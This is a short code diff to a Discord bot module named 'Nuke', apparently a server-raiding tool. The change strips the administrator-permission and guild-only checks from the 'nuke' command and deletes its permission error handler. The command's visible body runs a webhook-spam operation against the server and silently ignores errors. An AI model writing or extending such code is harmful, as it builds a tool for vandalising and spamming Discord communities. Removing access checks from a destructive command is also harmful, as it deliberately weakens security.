@@ -14,8 +14,6 @@ class Nuke(commands.Cog):
         self.operations: Operations = bot.operations
 
     @commands.command(name="nuke")
-    @commands.has_permissions(administrator=True)
-    @commands.guild_only()
     async def nuke(self, ctx: commands.Context) -> None:
         guild = ctx.guild
         if not self.operations:
@@ -30,12 +28,6 @@ class Nuke(commands.Cog):
             await self.operations.spam_webhook(guild)
         except Exception as e:
             pass
-        
-    @nuke.error
-    async def nuke_error(self, ctx: commands.Context, error):
-        if isinstance(error, commands.MissingPermissions):
-            await ctx.reply("you need administrator for this", delete_after=5)
-
 
 async def setup(bot: commands.Bot) -> None:
     if not hasattr(bot.http, "fast_limiter"):
